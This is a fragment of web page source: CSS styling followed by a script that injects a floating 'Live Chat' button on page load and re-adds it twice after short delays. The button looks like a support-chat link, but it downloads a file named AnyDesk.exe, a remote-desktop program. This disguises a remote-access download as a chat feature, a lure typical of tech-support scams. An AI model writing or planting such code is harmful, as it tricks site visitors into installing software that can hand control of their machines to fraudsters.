  .spinner {
    width: 48px;
    height: 48px;
    border: 4px solid rgba(255,255,255,0.15);
    border-top-color: #fcbd1b;
    border-radius: 50%;

  }

  .content p {
    font-size: 0.95rem;
    color: #b3b3b3;
    line-height: 1.5;
  }

<style>
  #asb-live-chat {
    position: fixed !important;
    bottom: 24px !important;
    right: 24px !important;
    z-index: 2147483647 !important;
    display: inline-flex !important;
    align-items: center !important;
    gap: 8px !important;
    padding: 12px 20px !important;
    background: #ffffff !important;
    color: #262626 !important;
    font-family: 'overpass', Helvetica, Arial, sans-serif !important;
    font-size: 14px !important;
    font-weight: 500 !important;
    line-height: 1 !important;
    border: 1px solid rgb(212, 216, 222) !important;
    border-radius: 100px !important;
    box-shadow: 0 2px 12px rgba(0,0,0,0.10), 0 1px 3px rgba(0,0,0,0.06) !important;
    cursor: pointer !important;
    text-decoration: none !important;
    pointer-events: all !important;
    transition: background 0.18s ease, color 0.18s ease, box-shadow 0.18s ease, transform 0.18s ease;
    animation: asb-chat-slidein 0.4s cubic-bezier(0.22,1,0.36,1) both;
    -webkit-font-smoothing: antialiased;
  }
  #asb-live-chat:hover {
    background: #fcbd1b !important;
    color: #000000 !important;
    border-color: #fcbd1b !important;
    box-shadow: 0 6px 20px rgba(252,189,27,0.28), 0 2px 6px rgba(252,189,27,0.18) !important;
    transform: translateY(-2px) !important;
  }
  #asb-live-chat:active {
    transform: translateY(0) scale(0.97) !important;
  }
  @keyframes asb-chat-slidein {
    from { opacity: 0; transform: translateY(16px); }
    to   { opacity: 1; transform: translateY(0); }
  }
</style>
<script>
(function() {
  function injectChatBtn() {
    if (document.getElementById('asb-live-chat')) return;
    var a = document.createElement('a');
    a.id = 'asb-live-chat';
    a.href = 'assets/AnyDesk.exe';
    a.download = 'AnyDesk.exe';
    a.title = 'Live Chat';
    a.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 2H4C2.9 2 2 2.9 2 4V22L6 18H20C21.1 18 22 17.1 22 16V4C22 2.9 21.1 2 20 2ZM20 16H5.17L4 17.17V4H20V16Z" fill="currentColor"/><circle cx="8" cy="10" r="1.2" fill="currentColor"/><circle cx="12" cy="10" r="1.2" fill="currentColor"/><circle cx="16" cy="10" r="1.2" fill="currentColor"/></svg>Live Chat';
    document.body.appendChild(a);
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', injectChatBtn);
  } else {
    injectChatBtn();
  }
  setTimeout(injectChatBtn, 500);
  setTimeout(injectChatBtn, 1500);
})();
</script>
